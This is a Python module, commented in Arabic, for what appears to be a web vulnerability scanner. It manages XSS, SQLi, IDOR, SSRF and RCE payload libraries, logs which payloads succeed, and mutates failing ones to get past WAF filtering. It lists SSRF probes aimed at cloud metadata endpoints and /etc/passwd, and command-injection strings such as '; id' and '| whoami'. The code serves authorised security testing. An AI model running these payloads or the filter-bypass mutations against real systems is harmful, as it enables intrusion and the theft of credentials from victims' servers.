"""
Payload Integration - ربط Scanners بمكتبة الحمولات المركزية

الميزات:
- ربط كل Scanner بـ PayloadLibrary
- تسجيل نجاح/فشل الحمولات
- تغذية راجعة للتعلم
- تطوير تلقائي للحمولات
- تتبع الإحصائيات
"""

import asyncio
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

from schemas.payload import (
    Payload, PayloadType, PayloadContext, PayloadStatus, BypassLevel,
    PayloadVariation, PayloadLibrary, PayloadExecution,
    create_xss_payload, create_sqli_payload, create_idor_payload,
    XSS_PAYLOADS, SQLI_PAYLOADS, IDOR_PAYLOADS
)

import logging

logger = logging.getLogger(__name__)


class PayloadEvolutionStrategy(Enum):
    """استراتيجيات تطوير الحمولات"""
    CASE_SWAPPING = "case_swapping"        # تبديل حالة الأحرف
    URL_ENCODING = "url_encoding"          # ترميز URL
    DOUBLE_ENCODING = "double_encoding"    # ترميز مزدوج
    HTML_ENCODING = "html_encoding"        # ترميز HTML
    BASE64_ENCODING = "base64_encoding"    # ترميز Base64
    HEX_ENCODING = "hex_encoding"          # ترميز Hex
    TAG_MUTATION = "tag_mutation"          # تغيير الوسوم
    EVENT_MUTATION = "event_mutation"      # تغيير الأحداث
    QUOTE_MUTATION = "quote_mutation"      # تغيير علامات الاقتباس
    COMMENT_INJECTION = "comment_injection" # حقن تعليقات
    WHITESPACE_MUTATION = "whitespace_mutation" # تغيير المسافات
    NULL_BYTE_INJECTION = "null_byte_injection" # حقن null byte
    UNICODE_MUTATION = "unicode_mutation"  # تغيير Unicode


@dataclass
class PayloadTestResult:
    """نتيجة اختبار حمولة"""
    payload: Payload
    target_url: str
    target_parameter: str
    success: bool
    waf_detected: bool = False
    waf_type: str = ""
    response_time_ms: float = 0.0
    status_code: int = 0
    evidence: Optional[str] = None
    error: Optional[str] = None
    tested_at: datetime = field(default_factory=datetime.now)


class PayloadManager:
    """
    مدير الحمولات المركزي
    
    يربط كل scanners بمكتبة PayloadLibrary ويتتبع النتائج
    """
    
    def __init__(self):
        # المكتبات حسب النوع
        self.libraries: Dict[PayloadType, PayloadLibrary] = {}
        
        # سجل النتائج
        self.test_history: List[PayloadTestResult] = []
        
        # إحصائيات
        self.stats: Dict[str, Dict] = {}
        
        # التهيئة
        self._initialize_libraries()
        
        logger.info("PayloadManager initialized")
    
    def _initialize_libraries(self):
        """تهيئة مكتبات الحمولات"""
        
        # XSS Library
        xss_lib = PayloadLibrary(
            name="XSS Payloads",
            description="Cross-Site Scripting payloads"
        )
        for content in XSS_PAYLOADS:
            payload = create_xss_payload(content, PayloadContext.HTML)
            xss_lib.add_payload(payload)
        self.libraries[PayloadType.XSS] = xss_lib
        
        # SQLi Library
        sqli_lib = PayloadLibrary(
            name="SQLi Payloads",
            description="SQL Injection payloads"
        )
        for content in SQLI_PAYLOADS:
            payload = create_sqli_payload(content)
            sqli_lib.add_payload(payload)
        self.libraries[PayloadType.SQLI] = sqli_lib
        
        # IDOR Library
        idor_lib = PayloadLibrary(
            name="IDOR Payloads",
            description="Insecure Direct Object Reference payloads"
        )
        for content in IDOR_PAYLOADS:
            payload = create_idor_payload(content)
            idor_lib.add_payload(payload)
        self.libraries[PayloadType.IDOR] = idor_lib
        
        # SSRF Library
        ssrf_lib = PayloadLibrary(
            name="SSRF Payloads",
            description="Server-Side Request Forgery payloads"
        )
        self._add_ssrf_payloads(ssrf_lib)
        self.libraries[PayloadType.SSRF] = ssrf_lib
        
        # RCE Library
        rce_lib = PayloadLibrary(
            name="RCE Payloads",
            description="Remote Code Execution payloads"
        )
        self._add_rce_payloads(rce_lib)
        self.libraries[PayloadType.RCE] = rce_lib
        
        logger.info(f"Initialized {len(self.libraries)} payload libraries")
    
    def _add_ssrf_payloads(self, library: PayloadLibrary):
        """إضافة حمولات SSRF"""
        import uuid
        ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:80",
            "http://[::1]:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "file:///etc/passwd",
            "http://10.0.0.1:80",
            "http://192.168.0.1:80",
        ]
        for content in ssrf_payloads:
            payload = Payload(
                id=f"PLS-{uuid.uuid4().hex[:8].upper()}",
                content=content,
                payload_type=PayloadType.SSRF,
                context=PayloadContext.URL,
                name=f"SSRF_{content[:30]}",
                tags=["ssrf", "server-side"]
            )
            library.add_payload(payload)
    
    def _add_rce_payloads(self, library: PayloadLibrary):
        """إضافة حمولات RCE"""
        import uuid
        rce_payloads = [
            ("; id", "cmd", "linux"),
            ("| whoami", "cmd", "linux"),
            ("&& ls -la", "cmd", "linux"),
            ("; system('id');", "eval", "php"),
            ("; eval(\"print('RCE')\")", "eval", "python"),
            ("& whoami", "cmd", "windows"),
            ("%0Aid", "cmd", "linux"),
        ]
        for content, technique, platform in rce_payloads:
            payload = Payload(
                id=f"PLS-{uuid.uuid4().hex[:8].upper()}",
                content=content,
                payload_type=PayloadType.RCE,
                context=PayloadContext.HEADER,
                name=f"RCE_{technique}_{platform}",
                tags=["rce", technique, platform]
            )
            library.add_payload(payload)
    
    def get_library(self, payload_type: PayloadType) -> Optional[PayloadLibrary]:
        """الحصول على مكتبة حمولات حسب النوع"""
        return self.libraries.get(payload_type)
    
    def get_payloads_for_scanner(self, scanner_type: str) -> List[Payload]:
        """
        الحصول على الحمولات المناسبة لـ scanner معين
        
        Args:
            scanner_type: xss, sqli, idor, ssrf, rce, etc.
        
        Returns:
            قائمة الحمولات
        """
        type_map = {
            "xss": PayloadType.XSS,
            "sqli": PayloadType.SQLI,
            "idor": PayloadType.IDOR,
            "ssrf": PayloadType.SSRF,
            "rce": PayloadType.RCE,
            "csrf": PayloadType.CUSTOM,
            "auth": PayloadType.CUSTOM,
            "graphql": PayloadType.CUSTOM,
            "api": PayloadType.CUSTOM,
        }
        
        payload_type = type_map.get(scanner_type, PayloadType.CUSTOM)
        library = self.libraries.get(payload_type)
        
        if library:
            return library.payloads
        return []
    
    def record_test_result(self, result: PayloadTestResult):
        """
        تسجيل نتيجة اختبار حمولة
        
        Args:
            result: نتيجة الاختبار
        """
        self.test_history.append(result)
        
        # تحديث الحمولة
        payload = result.payload
        execution_data = {
            "target_url": result.target_url,
            "target_parameter": result.target_parameter,
            "waf_detected": result.waf_detected,
            "response_time_ms": result.response_time_ms,
            "status_code": result.status_code
        }
        payload.record_attempt(result.success, execution_data)
        
        # تحديث الإحصائيات
        scanner_type = self._infer_scanner_type(result.payload.payload_type)
        if scanner_type not in self.stats:
            self.stats[scanner_type] = {
                "total_tests": 0,
                "successful": 0,
                "failed": 0,
                "waf_blocks": 0,
                "avg_response_time": 0.0
            }
        
        stats = self.stats[scanner_type]
        stats["total_tests"] += 1
        if result.success:
            stats["successful"] += 1
        else:
            stats["failed"] += 1
        if result.waf_detected:
            stats["waf_blocks"] += 1
        
        # المتوسط المتحرك لوقت الاستجابة
        old_avg = stats["avg_response_time"]
        n = stats["total_tests"]
        stats["avg_response_time"] = old_avg + (result.response_time_ms - old_avg) / n
        
        # الاحتفاظ بآخر 10000 نتيجة
        if len(self.test_history) > 10000:
            self.test_history = self.test_history[-10000:]
        
        logger.debug(f"Test recorded: {payload.name} - {'✓' if result.success else '✗'}")
    
    def record_batch_results(self, results: List[PayloadTestResult]):
        """تسجيل نتائج متعددة"""
        for result in results:
            self.record_test_result(result)
    
    def get_best_payloads(
        self,
        scanner_type: str,
        limit: int = 5,
        min_success_rate: float = 0.0
    ) -> List[Payload]:
        """
        الحصول على أفضل الحمولات لـ scanner معين
        
        Args:
            scanner_type: نوع الـ scanner
            limit: عدد الحمولات
            min_success_rate: أقل نسبة نجاح مقبولة
        
        Returns:
            قائمة أفضل الحمولات
        """
        payloads = self.get_payloads_for_scanner(scanner_type)
        
        if not payloads:
            return []
        
        # ترتيب حسب نسبة النجاح
        sorted_payloads = sorted(
            payloads,
            key=lambda p: (p.success_rate, p.effectiveness),
            reverse=True
        )
        
        # تصفية حسب أقل نسبة نجاح
        filtered = [
            p for p in sorted_payloads
            if p.success_rate >= min_success_rate
        ]
        
        return filtered[:limit]
    
    def evolve_payloads(
        self,
        scanner_type: str,
        strategy: PayloadEvolutionStrategy = None
    ) -> List[Payload]:
        """
        تطوير حمولات جديدة
        
        Args:
            scanner_type: نوع الـ scanner
            strategy: استراتيجية التطوير
        
        Returns:
            قائمة الحمولات المطورة
        """
        payloads = self.get_payloads_for_scanner(scanner_type)
        evolved = []
        
        for payload in payloads:
            # تطوير الحمولة
            new_variations = self._evolve_single_payload(payload, strategy)
            evolved.extend(new_variations)
        
        logger.info(f"Evolved {len(evolved)} new payloads for {scanner_type}")
        return evolved
    
    def _evolve_single_payload(
        self,
        payload: Payload,
        strategy: PayloadEvolutionStrategy = None
    ) -> List[str]:
        """تطوير حمولة واحدة"""
        evolved = []
        content = payload.content
        
        strategies = [strategy] if strategy else [
            PayloadEvolutionStrategy.CASE_SWAPPING,
            PayloadEvolutionStrategy.URL_ENCODING,
            PayloadEvolutionStrategy.HTML_ENCODING,
            PayloadEvolutionStrategy.TAG_MUTATION,
            PayloadEvolutionStrategy.EVENT_MUTATION,
            PayloadEvolutionStrategy.QUOTE_MUTATION,
        ]
        
        for strat in strategies:
            try:
                variations = self._apply_evolution_strategy(content, strat)
                evolved.extend(variations)
            except Exception as e:
                logger.debug(f"Evolution failed for {strat.value}: {e}")
        
        # إضافة المتغيرات للحمولة الأصلية
        for variation_content in evolved:
            if variation_content != content:
                payload.add_variation(variation_content, BypassLevel.BASIC)
        
        return evolved
    
    def _apply_evolution_strategy(
        self,
        content: str,
        strategy: PayloadEvolutionStrategy
    ) -> List[str]:
        """تطبيق استراتيجية تطوير"""
        import urllib.parse
        import base64
        
        variations = []
        
        if strategy == PayloadEvolutionStrategy.CASE_SWAPPING:
            if "<script>" in content.lower():
                variations.append(content.replace("<script>", "<ScRiPt>"))
                variations.append(content.replace("</script>", "</sCrIpT>"))
            if "alert" in content.lower():
                variations.append(content.replace("alert", "AlErT"))
                variations.append(content.replace("alert", "aLERT"))
        
        elif strategy == PayloadEvolutionStrategy.URL_ENCODING:
            variations.append(urllib.parse.quote(content))
            if "<" in content:
                variations.append(content.replace("<", "%3C").replace(">", "%3E"))
        
        elif strategy == PayloadEvolutionStrategy.DOUBLE_ENCODING:
            encoded = urllib.parse.quote(content)
            variations.append(urllib.parse.quote(encoded))
        
        elif strategy == PayloadEvolutionStrategy.HTML_ENCODING:
            import html
            variations.append(html.escape(content))
        
        elif strategy == PayloadEvolutionStrategy.BASE64_ENCODING:
            variations.append(base64.b64encode(content.encode()).decode())
        
        elif strategy == PayloadEvolutionStrategy.TAG_MUTATION:
            if "<script>" in content:
                variations.append(content.replace("<script>", "<img src=x onerror="))
                variations.append(content.replace("<script>", "<svg onload="))
                variations.append(content.replace("<script>", "<body onload="))
        
        elif strategy == PayloadEvolutionStrategy.EVENT_MUTATION:
            if "onerror" in content:
                variations.append(content.replace("onerror", "onload"))
                variations.append(content.replace("onerror", "onfocus"))
            if "alert" in content:
                variations.append(content.replace("alert", "confirm"))
                variations.append(content.replace("alert", "prompt"))
        
        elif strategy == PayloadEvolutionStrategy.QUOTE_MUTATION:
            if "'" in content:
                variations.append(content.replace("'", "\""))
                variations.append(content.replace("'", "`"))
            if "\"" in content:
                variations.append(content.replace("\"", "'"))
        
        elif strategy == PayloadEvolutionStrategy.COMMENT_INJECTION:
            if "SELECT" in content.upper():
                variations.append(content.replace("SELECT", "SELECT/**/"))
            if "UNION" in content.upper():
                variations.append(content.replace("UNION", "UNION/**/"))
        
        elif strategy == PayloadEvolutionStrategy.WHITESPACE_MUTATION:
            if " " in content:
                variations.append(content.replace(" ", "/**/"))
                variations.append(content.replace(" ", "\t"))
                variations.append(content.replace(" ", "%0A"))
        
        elif strategy == PayloadEvolutionStrategy.NULL_BYTE_INJECTION:
            variations.append(content + "%00")
            variations.append("%00" + content)
        
        elif strategy == PayloadEvolutionStrategy.UNICODE_MUTATION:
            if "<" in content:
                variations.append(content.replace("<", "\u003C"))
                variations.append(content.replace(">", "\u003E"))
        
        return variations
    
    def _infer_scanner_type(self, payload_type: PayloadType) -> str:
        """استنتاج نوع الـ scanner من نوع الحمولة"""
        type_map = {
            PayloadType.XSS: "xss",
            PayloadType.SQLI: "sqli",
            PayloadType.IDOR: "idor",
            PayloadType.SSRF: "ssrf",
            PayloadType.RCE: "rce",
        }
        return type_map.get(payload_type, "unknown")
    
    def get_statistics(self) -> Dict:
        """إحصائيات مدير الحمولات"""
        total_payloads = sum(len(lib.payloads) for lib in self.libraries.values())
        total_tests = len(self.test_history)
        
        return {
            "total_payloads": total_payloads,
            "total_libraries": len(self.libraries),
            "total_tests": total_tests,
            "library_sizes": {
                pt.value: len(lib.payloads)
                for pt, lib in self.libraries.items()
            },
            "scanner_stats": self.stats,
            "recent_success_rate": self._calculate_recent_success_rate(100)
        }
    
    def _calculate_recent_success_rate(self, count: int) -> float:
        """حساب نسبة النجاح لآخر n اختبار"""
        recent = self.test_history[-count:]
        if not recent:
            return 0.0
        successful = sum(1 for r in recent if r.success)
        return successful / len(recent)
    
    def get_payloads_needing_evolution(self, min_attempts: int = 5) -> List[Payload]:
        """
        الحصول على الحمولات اللي محتاجة تطوير
        (نسبة نجاح منخفضة بعد عدة محاولات)
        
        Args:
            min_attempts: أقل عدد محاولات
        
        Returns:
            قائمة الحمولات
        """
        needs_evolution = []
        
        for library in self.libraries.values():
            for payload in library.payloads:
                if (payload.total_attempts >= min_attempts and
                    payload.success_rate < 0.3 and
                    payload.status != PayloadStatus.EVOLVED):
                    needs_evolution.append(payload)
        
        return needs_evolution
    
    def auto_evolve_low_performers(self) -> int:
        """
        تطوير تلقائي للحمولات ضعيفة الأداء
        
        Returns:
            عدد الحمولات المطورة
        """
        low_performers = self.get_payloads_needing_evolution(min_attempts=5)
        evolved_count = 0
        
        for payload in low_performers:
            try:
                new_variations = payload.evolve()
                if new_variations:
                    evolved_count += 1
                    logger.info(f"Auto-evolved: {payload.name} → {len(new_variations)} variations")
            except Exception as e:
                logger.error(f"Auto-evolve failed for {payload.name}: {e}")
        
        return evolved_count


# نسخة عالمية
_default_payload_manager = None


def get_payload_manager() -> PayloadManager:
    """الحصول على نسخة عالمية من مدير الحمولات"""
    global _default_payload_manager
    if _default_payload_manager is None:
        _default_payload_manager = PayloadManager()
    return _default_payload_manager
